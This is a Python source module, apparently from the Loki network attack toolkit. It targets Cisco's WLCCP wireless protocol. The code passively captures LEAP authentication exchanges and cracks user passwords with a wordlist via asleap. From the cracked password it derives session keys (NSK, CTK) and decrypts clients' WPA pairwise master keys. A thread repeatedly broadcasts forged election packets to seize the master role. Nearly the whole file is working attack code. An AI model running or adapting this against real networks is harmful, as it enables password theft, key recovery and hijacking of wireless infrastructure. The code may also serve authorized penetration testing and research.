#       module_wlccp.py
#       
#       Copyright 2010 Daniel Mende <dmende@ernw.de>
#

#       Redistribution and use in source and binary forms, with or without
#       modification, are permitted provided that the following conditions are
#       met:
#       
#       * Redistributions of source code must retain the above copyright
#         notice, this list of conditions and the following disclaimer.
#       * Redistributions in binary form must reproduce the above
#         copyright notice, this list of conditions and the following disclaimer
#         in the documentation and/or other materials provided with the
#         distribution.
#       * Neither the name of the  nor the names of its
#         contributors may be used to endorse or promote products derived from
#         this software without specific prior written permission.
#       
#       THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS
#       "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
#       LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR
#       A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT
#       OWNER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL,
#       SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT
#       LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE,
#       DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY
#       THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
#       (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
#       OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

import hashlib
import hmac
import struct
import socket
import sys
import threading
import time
import traceback

import gobject
import gtk
import gtk.glade

import dnet
import dpkt

import loki_bindings

DEBUG = False

class wlccp_header(object):
    def __init__(self, version=None, sap=None, dst_type=None, msg_type=None, id=None, flags=None, orig_node_type=None, orig_node_mac=None, dst_node_type=None, dst_node_mac=None):
        self.version = version
        self.sap = sap
        self.dst_type = dst_type
        self.len = None
        self.msg_type = msg_type
        self.hopcount = 0
        self.id = id
        self.flags = flags
        self.orig_node_type = orig_node_type
        self.orig_node_mac = orig_node_mac
        self.dst_node_type = dst_node_type
        self.dst_node_mac = dst_node_mac

    def render(self, data):
        return struct.pack("!BBHHBBHHH", self.version, self.sap, self.dst_type, len(data) + 28, self.msg_type, self.hopcount, self.id, self.flags, self.orig_node_type) + self.orig_node_mac + struct.pack("!H", self.dst_node_type) + self.dst_node_mac + data

    def parse(self, data):
        (self.version, self.sap, self.dst_type, self.len, self.msg_type, self.hopcount, self.id, self.flags, self.orig_node_type) = struct.unpack("!BBHHBBHHH", data[:14])
        self.orig_node_mac = data[14:20]
        (self.dst_node_type,) = struct.unpack("!H", data[20:22])
        self.dst_node_mac = data[22:28]
        return data[28:]

class wlccp_adv_reply(object):
    def __init__ (self, flags=None, election_group=None, attach_count=None, smc_prio=None, bridge_prio=None, node_id=None, age=None, adv_time=None, tlv1=None, tlv2=None, tlv3=None, tlv4=None):
        self.flags = flags
        self.election_group = election_group
        self.attach_count = attach_count
        self.smc_prio = smc_prio
        self.bridge_prio = bridge_prio
        self.node_id = node_id
        self.age = age
        self.adv_time = adv_time
        self.tlv1 = tlv1
        self.tlv2 = tlv2
        self.tlv3 = tlv3
        self.tlv4 = tlv4

    #RENDER !?!

    def parse(self, data):
        (self.flags, self.election_group, self.attach_count, self.smc_prio, self.bridge_prio) = struct.unpack("!HBBBB", data[:6])
        self.node_id = data[6:12]
        (self.age, self.adv_time) = struct.unpack("!2xL3xB", data[12:22])

class wlccp_eap_auth(object):
    def __init__(self, requestor_type=None, requestor_mac=None, aaa_msg_type=None, aaa_auth_type=None, aaa_key_mgmt_type=None, status_code=None):
        self.requestor_type = requestor_type
        self.requestor_mac = requestor_mac
        self.aaa_msg_type = aaa_msg_type
        self.aaa_auth_type = aaa_auth_type
        self.aaa_key_mgmt_type = aaa_key_mgmt_type
        self.status_code = status_code

    #RENDER !?!
    
    def parse(self, data):
        (self.requestor_type,) = struct.unpack("!H", data[:2])
        self.requestor_mac = data[2:8]
        (self.aaa_msg_type, self.aaa_auth_type, self.aaa_key_mgmt_type, self.status_code) = struct.unpack("!BBBB", data[8:12])
        return data[12:]

class election_thread(threading.Thread):
    WLCCP_DST_MAC = "01:40:96:ff:ff:c0"
    WLCCP_ETH_TYPE = 0x2d87
    BLOB1 = "\x00\x1f\x00\x10\x00\x08"
    BLOB2 = "\x00\x03\x00\x0c"
    BLOB3 = "\x18\x00\x00\x00"
    BLOB4 = "\x00\x23\x00\x06\x00\x01"
    BLOB5 = "\x00\x25\x00\x06\x00\x00"
    
    def __init__(self, parent, mac, ip):
        self.parent = parent
        self.mac = mac
        self.ip = ip
        self.running = True
        self.delay = 5
        threading.Thread.__init__(self)
    
    def run(self):
        self.parent.log("WLCCP: Election Thread started")
        header = wlccp_header(0xc1, 0x0, 0x8003, 0x41, 0x0, 0x2800, 0x0, dnet.eth_aton("00:00:00:00:00:00"), 0x2, dnet.eth_aton(self.mac))
        h_data = header.render("%s\x00\x01\x00\x00\xff\x00%s\x00\x00\x00\x00\x00\x02\x00\x00\x00\x05%s%s%s%s%s%s%s%s"
                    % ( dnet.eth_aton(self.mac),
                        dnet.eth_aton(self.mac),
                        self.BLOB1,
                        dnet.eth_aton(self.mac),
                        dnet.ip_aton(self.ip),
                        self.BLOB2,
                        dnet.ip_aton(self.ip),
                        self.BLOB3,
                        self.BLOB4,
                        self.BLOB5
                        )  )
        data = dnet.eth_pack_hdr(dnet.eth_aton(self.WLCCP_DST_MAC), dnet.eth_aton(self.mac), socket.htons(self.WLCCP_ETH_TYPE)) + h_data
        
        while self.running:
            if self.parent.dnet:
                self.parent.dnet.send(data)
                for x in xrange(self.delay):
                    if not self.running:
                        break
                    time.sleep(1)
        self.parent.log("WLCCP: Election Thread terminated")

    def quit(self):
        self.running = False

class mod_class(object):
    HOSTS_HOST_ROW = 0
    HOSTS_TYPE_ROW = 1
    HOSTS_PRIO_ROW = 2

    CLIENTS_HOST_ROW = 0
    CLIENTS_SSID_ROW = 1
    CLIENTS_PMK_ROW = 2
    
    COMMS_HOST_ROW = 0
    COMMS_TYPE_ROW = 1
    COMMS_STATE_ROW = 2
    COMMS_ORIGIN_ROW = 3

    node_types = {  0x00 : "NODE_TYPE_NONE",
                    0x01 : "NODE_TYPE_AP",
                    0x02 : "NODE_TYPE_SCM",
                    0x04 : "NODE_TYPE_LCM",
                    0x08 : "NODE_TYPE_CCM",
                    0x10 : "NODE_TYPE_INFRA",
                    0x40 : "NODE_TYPE_CLIENT",
                    0x8000 : "NODE_TYPE_MULTICAST"
                    }
                    
    NODE_TYPE_NONE = 0x00
    NODE_TYPE_AP = 0x01
    NODE_TYPE_SCM = 0x02
    NODE_TYPE_LCM = 0x04
    NODE_TYPE_CCM = 0x08
    NODE_TYPE_INFRA = 0x10
    NODE_TYPE_CLIENT = 0x40
    NODE_TYPE_MULTICAST = 0x8000
                        
    def __init__(self, parent, platform):
        self.parent = parent
        self.platform = platform
        self.name = "wlccp"
        self.group = "CISCO"
        self.gladefile = "/modules/module_wlccp.glade"
        self.hosts_liststore = gtk.ListStore(str, str, str)
        self.clients_liststore = gtk.ListStore(str, str, str)
        self.comms_treestore = gtk.TreeStore(str, str, str, str)
        self.dnet = None
        self.election_thread = None

    def start_mod(self):
        self.hosts = {}
        self.comms = {}
        self.clients = {}
        
    def shut_mod(self):
        if self.election_thread:
            self.election_thread.quit()

    def get_root(self):
        self.glade_xml = gtk.glade.XML(self.parent.data_dir + self.gladefile)
        dic = { "on_crack_leap_button_clicked" : self.on_crack_leap_button_clicked,
                "on_get_master_togglebutton_toggled" : self.on_get_master_togglebutton_toggled
                }
        self.glade_xml.signal_autoconnect(dic)

        self.hosts_treeview = self.glade_xml.get_widget("hosts_treeview")
        self.hosts_treeview.set_model(self.hosts_liststore)
        self.hosts_treeview.set_headers_visible(True)

        self.clients_treeview = self.glade_xml.get_widget("clients_treeview")
        self.clients_treeview.set_model(self.clients_liststore)
        self.clients_treeview.set_headers_visible(True)

        self.comms_treeview = self.glade_xml.get_widget("comms_treeview")
        self.comms_treeview.set_model(self.comms_treestore)
        self.comms_treeview.set_headers_visible(True)

        column = gtk.TreeViewColumn()
        column.set_title("Host")
        render_text = gtk.CellRendererText()
        column.pack_start(render_text, expand=True)
        column.add_attribute(render_text, 'text', self.HOSTS_HOST_ROW)
        self.hosts_treeview.append_column(column)
        column = gtk.TreeViewColumn()
        column.set_title("Type")
        render_text = gtk.CellRendererText()
        column.pack_start(render_text, expand=True)
        column.add_attribute(render_text, 'text', self.HOSTS_TYPE_ROW)
        self.hosts_treeview.append_column(column)
        column = gtk.TreeViewColumn()
        column.set_title("Priority")
        render_text = gtk.CellRendererText()
        column.pack_start(render_text, expand=True)
        column.add_attribute(render_text, 'text', self.HOSTS_PRIO_ROW)
        self.hosts_treeview.append_column(column)
        
        column = gtk.TreeViewColumn()
        column.set_title("Host")
        render_text = gtk.CellRendererText()
        column.pack_start(render_text, expand=True)
        column.add_attribute(render_text, 'text', self.CLIENTS_HOST_ROW)
        self.clients_treeview.append_column(column)
        column = gtk.TreeViewColumn()
        column.set_title("SSID")
        render_text = gtk.CellRendererText()
        column.pack_start(render_text, expand=True)
        column.add_attribute(render_text, 'text', self.CLIENTS_SSID_ROW)
        self.clients_treeview.append_column(column)
        column = gtk.TreeViewColumn()
        column.set_title("PMK")
        render_text = gtk.CellRendererText()
        column.pack_start(render_text, expand=True)
        column.add_attribute(render_text, 'text', self.CLIENTS_PMK_ROW)
        self.clients_treeview.append_column(column)

        column = gtk.TreeViewColumn()
        column.set_title("Hosts")
        render_text = gtk.CellRendererText()
        column.pack_start(render_text, expand=True)
        column.add_attribute(render_text, 'text', self.COMMS_HOST_ROW)
        self.comms_treeview.append_column(column)
        column = gtk.TreeViewColumn()
        column.set_title("Type")
        render_text = gtk.CellRendererText()
        column.pack_start(render_text, expand=True)
        column.add_attribute(render_text, 'text', self.COMMS_TYPE_ROW)
        self.comms_treeview.append_column(column)
        column = gtk.TreeViewColumn()
        column.set_title("State")
        render_text = gtk.CellRendererText()
        column.pack_start(render_text, expand=True)
        column.add_attribute(render_text, 'text', self.COMMS_STATE_ROW)
        self.comms_treeview.append_column(column)

        self.wordlist_filechooserbutton = self.glade_xml.get_widget("wordlist_filechooserbutton")
        
        self.ip_entry = self.glade_xml.get_widget("ip_entry")
        self.mac_entry = self.glade_xml.get_widget("mac_entry")
        
        return self.glade_xml.get_widget("root")

    def log(self, msg):
        self.__log(msg, self.name)

    def set_log(self, log):
        self.__log = log

    def get_eth_checks(self):
        return (self.check_eth, self.input_eth)

    def set_ip(self, ip, mask):
        self.ip = ip
        self.mask = mask
        self.ip_entry.set_text(self.ip)

    def set_dnet(self, dnet_thread):
        self.dnet = dnet_thread
        self.mac = dnet.eth_ntoa(dnet_thread.eth.get())
        self.mac_entry.set_text(self.mac)

    def check_eth(self, eth):
        if eth.type == 0x872d:
            return (True, False)
        return (False, False)

    def input_eth(self, eth, timestamp):
        header = wlccp_header()
        ret = header.parse(eth.data)
        orig = dnet.eth_ntoa(header.orig_node_mac)
        dst = dnet.eth_ntoa(header.dst_node_mac)
        if header.msg_type == 0x01:
            #SCM advertisment request
            if not orig == "00:00:00:00:00:00":
                if orig not in self.hosts:
                    type = self.node_types[header.orig_node_type]
                    iter = self.hosts_liststore.append([orig, type, ""])
                    self.hosts[orig] = (iter,)
        elif header.msg_type == 0x41:
            #SCM advertisment reply
            if not dst == "00:00:00:00:00:00":
                type = self.node_types[header.dst_node_type]
                prio = str(ord(ret[10]))
                if dst not in self.hosts:
                    iter = self.hosts_liststore.append([dst, type, prio])
                    self.hosts[dst] = (iter,)
                else:
                    (iter,) = self.hosts[dst]
                    self.hosts_liststore.set(iter, self.HOSTS_TYPE_ROW, type, self.HOSTS_PRIO_ROW, prio)

    def get_udp_checks(self):
        return (self.check_udp, self.input_udp)

    def check_udp(self, udp):
        if udp.sport == 2887 and udp.dport == 2887:
            return (True, False)
        return (False, False)

    def input_udp(self, eth, ip, udp, timestamp):
        header = wlccp_header()
        ret = header.parse(udp.data)
        try:
            if DEBUG:
                print "WLCCP-TYPE %X" % header.msg_type
            if header.msg_type & 0x3f == 0x0b:
                #EAP AUTH
                eap_auth = wlccp_eap_auth()
                ret = eap_auth.parse(ret)
                host = dnet.eth_ntoa(eap_auth.requestor_mac)
                if DEBUG:
                    print "addr %s, type %X @ %s" % (dnet.eth_ntoa(eap_auth.requestor_mac), eap_auth.aaa_msg_type, timestamp)
                if host in self.comms:
                    (iter, leap, leap_pw, nsk, nonces, ctk) = self.comms[host]
                elif not host == "00:00:00:00:00:00":
                    iter = self.comms_treestore.append(None, ["%s\n       <=>\n%s" % (dnet.eth_ntoa(header.orig_node_mac), dnet.eth_ntoa(header.dst_node_mac)), self.node_types[eap_auth.requestor_type], "", host])
                    self.comms[host] = (iter, (None, None, None, None), None, None, (None, None, None, None, None, (None, None)), None)
                (eapol_version, eapol_type, eapol_len) = struct.unpack("!BBH", ret[2:6])
                ret = ret[6:]
                #check EAP-TYPE
                if eapol_type == 0x00:
                    (eap_code, eap_id, eap_len) = struct.unpack("!BBH", ret[:4])
                    ret = ret[4:]
                    #check EAP-CODE
                    if eap_code == 0x01:
                        (leap_type, leap_version, leap_reserved, leap_count) = struct.unpack("!BBBB", ret[:4])
                        ret = ret[4:]
                        #EAP-REQUEST
                        #check the leap hdr
                        if leap_type == 0x11 and leap_version == 0x01 and leap_reserved == 0x00 and leap_count == 0x08:
                            (leap_auth_chall, leap_auth_resp, leap_supp_chall, leap_supp_resp) = leap
                            if not leap_auth_chall and not leap_auth_resp and not leap_supp_chall and not leap_supp_resp:
                                id = eap_id
                                chall = ret[:8]
                                user = ret[8:16]
                                self.comms_treestore.set(iter, self.COMMS_STATE_ROW, "EAP-AUTH challenge from authenticator seen")
                                self.comms_treestore.append(iter, [ "User", user, "", "" ])
                                self.log("WLCCP: EAP-AUTH challenge from authenticator seen for %s" % host)
                                self.comms[host] = (iter, ((id, chall, user), leap_auth_resp, leap_supp_chall, leap_supp_resp), leap_pw, nsk, nonces, ctk)
                            elif leap_auth_chall and leap_auth_resp and not leap_supp_chall and not leap_supp_resp:
                                chall = ret[:8]
                                self.comms_treestore.set(iter, self.COMMS_STATE_ROW, "EAP-AUTH challenge from supplicant seen")
                                self.log("WLCCP: EAP-AUTH challenge from supplicant seen for %s" % host)
                                self.comms[host] = (iter, (leap_auth_chall, leap_auth_resp, chall, leap_supp_resp), leap_pw, nsk, nonces, ctk)
                            else:
                                if DEBUG:
                                    self.log("WLCCP: fail 5 %s %s %s %s" % (leap_auth_chall, leap_auth_resp, leap_supp_chall, leap_supp_resp))
                        else:
                            if DEBUG:
                                self.log("WLCCP: fail 3 %X %X %X %X" % (leap_type, leap_version, leap_reserved, leap_count))
                    elif eap_code == 0x02:
                        (leap_type, leap_version, leap_reserved, leap_count) = struct.unpack("!BBBB", ret[:4])
                        ret = ret[4:]
                        #EAP-RESPONSE
                        #check the leap hdr
                        if leap_type == 0x11 and leap_version == 0x01 and leap_reserved == 0x00 and leap_count == 0x18:
                            (leap_auth_chall, leap_auth_resp, leap_supp_chall, leap_supp_resp) = leap
                            if leap_auth_chall and not leap_auth_resp and not leap_supp_chall and not leap_supp_resp:
                                resp = ret[:24]
                                self.comms_treestore.set(iter, self.COMMS_STATE_ROW, "EAP-AUTH response from authenticator seen")
                                self.log("WLCCP: EAP-AUTH response from authenticator seen for %s" % host)
                                self.comms[host] = (iter, (leap_auth_chall, resp, leap_supp_chall, leap_supp_resp), leap_pw, nsk, nonces, ctk)
                            elif leap_auth_chall and leap_auth_resp and leap_supp_chall and not leap_supp_resp:
                                resp = ret[:24]
                                self.comms_treestore.set(iter, self.COMMS_STATE_ROW, "EAP-AUTH response from supplicant seen")
                                self.comms_treestore.append(iter, [ "Password", "*ready to crack*", "", "" ])
                                self.log("WLCCP: EAP-AUTH response from supplicant seen for %s" % host)
                                self.comms[host] = (iter, (leap_auth_chall, leap_auth_resp, leap_supp_chall, resp), leap_pw, nsk, nonces, ctk)
                            else:
                                if DEBUG:
                                    self.log("WLCCP: fail 6 %s %s %s %s" % (leap_auth_chall, leap_auth_resp, leap_supp_chall, leap_supp_resp))
                        else:
                            if DEBUG:
                                self.log("WLCCP: fail 4 %X %X %X %X" % (leap_type, leap_version, leap_reserved, leap_count))
                    else:
                        if DEBUG:
                            self.log("WLCCP: fail 2 %X" % eap_code)
                else:
                    if DEBUG:
                        self.log("WLCCP: fail 1 %X" % eapol_type)
            elif header.msg_type & 0x3f == 0x0c:
                host = dnet.eth_ntoa(header.orig_node_mac)
                if header.msg_type & 0xc0 == 0x40:
                    #cmPathInit_Reply found
                    if host in self.comms:
                        (iter, leap, leap_pw, nsk, (supp_node, dst_node, nonce_req, nonce_repl, counter, mic), ctk) = self.comms[host]
                        #skip WTLV_CM_PATH_INIT header
                        ret = ret[18:]
                        #skip WTLV_INIT_SESSION header
                        ret = ret[8:]
                        (type, len) = struct.unpack("!HH", ret[:4])
                        if not type == 0x10a or not len == 0x5a:
                            if DEBUG:
                                self.log("WLCCP: malformed WTLV_IN_SECURE_CONTEXT_REPLY header")
                            return
                        #get nonces from WTLV_IN_SECURE_CONTEXT_REPLY header
                        counter = ret[4:8]
                        supp_node = ret[8:16]
                        dst_node = ret[16:24]
                        nonces = ret[24:56]
                        #skip session timeout in WTLV_IN_SECURE_CONTEXT_REPLY header
                        ret = ret[60:]
                        #check for WTLV_MIC header
                        (type, len) = struct.unpack("!HH", ret[:4])
                        if not type == 0x108 or not len == 0x1e:
                            if DEBUG:
                                self.log("WLCCP: malformed WTLV_MIC header")
                            return
                        mic = ret[14:30]
                        if DEBUG:
                            self.log("WLCCP: found MIC %s" % mic.encode("hex"))
                        self.log("WLCCP: PATH-REPLY seen for %s" % host)
                        self.comms[host] = (iter, leap, leap_pw, nsk, (supp_node, dst_node, nonce_req, nonces, counter, (mic, udp.data)), ctk)
                else:
                    #cmPathInit_Request found
                    if host in self.comms:
                        (iter, leap, leap_pw, nsk, (supp_node, dst_node, nonce_req, nonce_repl, counter, mic), ctk) = self.comms[host]
                        #skip WTLV_CM_PATH_INIT header
                        ret = ret[18:]
                        #skip WTLV_INIT_SESSION header
                        ret = ret[8:]
                        #get nonces from WTLV_IN_SECURE_CONTEXT_REPLY header
                        nonces = ret[26:58]                            
                        self.log("WLCCP: PATH-REQUEST seen for %s" % host)
                        self.comms[host] = (iter, leap, leap_pw, nsk, (supp_node, dst_node, nonces, nonce_repl, counter, mic), ctk)
            elif header.msg_type & 0x3f == 0x09:
                host = dnet.eth_ntoa(header.orig_node_mac)
                if header.msg_type & 0xc0 == 0x40:
                    #PreRegistration_Reply found
                    if host in self.comms:
                        (iter, leap, leap_pw, nsk, (supp_node, dst_node, nonce_req, nonce_repl, counter, mic), ctk) = self.comms[host]
                        #skip PreRegistration header
                        ret = ret[22:]
                        (contextreq_len,) = struct.unpack("!H", ret[2:4])
                        #substract WLCCP_MIC_len
                        contextreq_len = contextreq_len - 30
                        #get Supplicant-ID from WLCCP_MN_SECURE_CONTEXT_REQ
                        id = ret[16:24]
                        (id_type,) = struct.unpack("!H", id[:2])
                        if id_type == self.NODE_TYPE_CLIENT:
                            client = dnet.eth_ntoa(id[2:])
                            if client in self.clients:
                                (iter, org_host, ssid, key_mgmt, ap, crypt, msc, pmk) = self.clients[client]
                                #get Destination-ID from WLCCP_MN_SECURE_CONTEXT_REQ
                                ap = dnet.eth_ntoa(ret[10:16])
                                crypt = ret[24:contextreq_len]
                                #skip WLCCP_MN_SECURE_CONTEXT_REPLY
                                ret = ret[contextreq_len:]
                                #get Message Sequence Counter from WLCCP_MIC
                                msc = ret[4:12]
                                self.clients[client] = (iter, org_host, ssid, key_mgmt, ap, crypt, msc, pmk)
                                self.log("WLCCP: PREREGISTRATION-REPLY seen for %s" % client)
                                self.get_pmk(client)
                else:
                    #PreRegistration_Request found
                    if host in self.comms:
                        (iter, leap, leap_pw, nsk, (supp_node, dst_node, nonce_req, nonce_repl, counter, mic), ctk) = self.comms[host]
                        #skip PreRegistration header
                        ret = ret[22:]
                        (type, len) = struct.unpack("!HH", ret[:4])
                        if type == 0x10b and len == 0x95:
                            #get Supplicant-ID from WLCCP_MN_SECURE_CONTEXT_REQ
                            id = ret[16:24]
                            (id_type,) = struct.unpack("!H", id[:2])
                            if id_type == self.NODE_TYPE_CLIENT:
                                client = dnet.eth_ntoa(id[2:])
                                #get key management type
                                key_mgmt = ret[25:26]
                                #get ssid len and ssid
                                (ssid_len,) = struct.unpack("!H", ret[68:70])
                                ssid = ret[70:70 + ssid_len]
                                if client not in self.clients:
                                    iter = self.clients_liststore.append([client, ssid, ""])
                                    self.clients[client] = (iter, None, ssid, key_mgmt, None, None, None, None)
                                else:
                                    (iter, org_host, org_ssid, org_key_mgmt, ap, crypt, msc, pmk) = self.clients[client]
                                    self.clients[client] = (iter, host, ssid, key_mgmt, ap, crypt, msc, pmk)
                                self.log("WLCCP: PREREGISTRATION-REQUEST seen for %s on ssid %s" % (client, ssid))
                            else:
                                if DEBUG:
                                    self.log("WLCCP: FAIL 3 %s" % id.encode("hex"))
                        else:
                            if DEBUG:
                                self.log("WLCCP: FAIL 2 %i:%i" % (type, len))
                    else:
                        if DEBUG:
                            self.log("WLCCP: FAIL 1 %s" % host)
        except:
            if DEBUG:
                print '-'*60
                traceback.print_exc(file=sys.stdout)
                print '-'*60

    def gen_nsk(self, host):
        if not host in self.comms:
            return None

        (iter, ((id, chall, user), leap_auth_resp, leap_supp_chall, leap_supp_resp), leap_pw, nsk, nonces, ctk) = self.comms[host]

        unicode_leap_pw = ""
        for i in leap_pw:
            unicode_leap_pw += (i + "\0")
        
        md4 = hashlib.new("md4", unicode_leap_pw).digest()
        md4 = hashlib.new("md4", md4).digest()
        
        md5 = hashlib.md5()
        md5.update(md4)
        md5.update(leap_supp_chall)
        md5.update(leap_supp_resp)
        md5.update(chall)
        md5.update(leap_auth_resp)

        return md5.digest()

    def calcPrf(self, key, input, offset, len, output, outOffset, outLen):
        numPasses = (outLen + 19) / 20
        passIndex = offset + len - 1
        outIndex = outOffset

        input = input[:passIndex] + chr(0)
        for currPass in xrange(numPasses):
            genHmacSHA1 = hmac.new(key, digestmod=hashlib.sha1)
            genHmacSHA1.update(input[offset:offset+len])
            output = output[:outOffset] + genHmacSHA1.digest()
            outOffset += 20
            input = input[:passIndex] + chr(ord(input[passIndex]) + 1)
        return output[:outLen]
        
    def rc4crypt(self, data, key):
        x = 0
        box = range(256)
        for i in xrange(256):
            x = (x + box[i] + ord(key[i % len(key)])) % 256
            box[i], box[x] = box[x], box[i]
        x = 0
        y = 0
        out = []
        for char in data:
            x = (x + 1) % 256
            y = (y + box[x]) % 256
            box[x], box[y] = box[y], box[x]
            out.append(chr(ord(char) ^ box[(box[x] + box[y]) % 256]))        
        return ''.join(out)

    def gen_ctk(self, host):
        if not host in self.comms:
            return None

        (iter, leap, leap_pw, nsk, (supp_node, dst_node, nonce_req, nonce_repl, counter, (mic, packet)), ctk) = self.comms[host]

        ctk_seed = "SWAN IN to IA linkContext Transfer Key Derivation\0%s%s%s%s%s\0" % (dst_node, supp_node, nonce_req, nonce_repl, counter)
        ctk = self.calcPrf(nsk, ctk_seed, 0, len(ctk_seed), "", 0, 32)
        i = self.comms_treestore.iter_parent(iter)
        if not i:
            i = iter
        connection = self.comms_treestore.get_value(i, self.COMMS_HOST_ROW)
        if mic and packet:
            mac = hmac.new(ctk[16:32])
            tmp = packet[54:-16]
            mac.update(tmp)
            result = mac.digest()
            if result != mic:
                print "=== OOOOPS something went wrong, MIC calculation failed ! ==="
                print "given mic:   %s" % mic.encode("hex")
                print "calced mic:  %s" % result.encode("hex")
        else:
            self.log("WLCCP: Can't verify CTK mic for connection %s, none found." % connection.replace('\n       <=>\n', ' <=> '))
        self.log("WLCCP: Found CTK %s for connection %s" % (ctk.encode("hex"), connection.replace('\n       <=>\n', ' <=> ')))
        return ctk

    def get_pmk(self, client):
        if client in self.clients:
            (iter, host, ssid, key_mgmt, ap, crypt, msc, pmk) = self.clients[client]
            if host in self.comms:
                (iter2, leap, leap_pw, nsk, nonces, ctk) = self.comms[host]
                if crypt and msc and ctk:
                    decrypt = self.rc4crypt("\0" * 256 + crypt, msc + ctk[:16])[256:]
                    #print decrypt.encode("hex")
                    pmk = decrypt[38:70]
                    self.clients_liststore.set(iter, self.CLIENTS_PMK_ROW, pmk.encode("hex"))
                    self.log("WLCCP: Got PMK %s for client %s on SSID %s" % (pmk.encode("hex"), client, ssid))
                    self.clients[client] = (iter, host, ssid, key_mgmt, ap, crypt, msc, pmk)

    def on_crack_leap_button_clicked(self, btn):
        select = self.comms_treeview.get_selection()
        (model, paths) = select.get_selected_rows()
        for i in paths:
            iter = model.iter_parent(model.get_iter(i))
            if not iter:
                iter = model.get_iter(i)
            host = model.get_value(iter, self.COMMS_ORIGIN_ROW)
            connection = model.get_value(iter, self.COMMS_HOST_ROW)
            (iter, (leap_auth_chall, leap_auth_resp, leap_supp_chall, leap_supp_resp), leap_pw, nsk, nonces, ctk) = self.comms[host]
            (id, chall, user) = leap_auth_chall
            if leap_auth_chall and leap_auth_resp:
                wl = self.wordlist_filechooserbutton.get_filename()
                if not wl:
                    return
                pw = loki_bindings.asleap.attack_leap(wl, chall, leap_auth_resp, id, user)
                if pw != "":
                    self.log("WLCCP: Found LEAP-Password %s for connection %s" % (pw, connection.replace('\n       <=>\n', ' <=> ')))
                    for j in xrange(self.comms_treestore.iter_n_children(iter)):
                        child = self.comms_treestore.iter_nth_child(iter, j)
                        if self.comms_treestore.get(child, self.COMMS_HOST_ROW) == ("Password",):
                           self.comms_treestore.set(child, self.COMMS_TYPE_ROW, pw)
                           break
                    self.comms[host] = (iter, (leap_auth_chall, leap_auth_resp, leap_supp_chall, leap_supp_resp), pw, nsk, nonces, ctk)
                    if model.get_value(iter, self.COMMS_TYPE_ROW) != self.node_types[0x40]:
                        nsk = self.gen_nsk(host)
                        self.comms_treestore.append(iter, [ "NSK", nsk.encode("hex"), "", "" ])
                        self.comms[host] = (iter, (leap_auth_chall, leap_auth_resp, leap_supp_chall, leap_supp_resp), pw, nsk, nonces, ctk)
                        ctk = self.gen_ctk(host)
                        self.comms_treestore.append(iter, [ "CTK", ctk.encode("hex"), "", "" ])
                        self.comms[host] = (iter, (leap_auth_chall, leap_auth_resp, leap_supp_chall, leap_supp_resp), pw, nsk, nonces, ctk)

                    for client in self.clients:
                        (iter, c_host, ssid, key_mgmt, ap, crypt, msc, pmk) = self.clients[client]
                        if c_host == host:
                            self.get_pmk(client)
                else:
                    self.log("WLCCP: Password for %s not found." % connection.replace('\n       <=>\n', ' <=> '))

    def on_get_master_togglebutton_toggled(self, btn):
        if btn.get_active():
            self.election_thread = election_thread(self, self.mac, self.ip)
            self.election_thread.start()
        else:
            if self.election_thread:
                self.election_thread.quit()
                self.election_thread = None
    
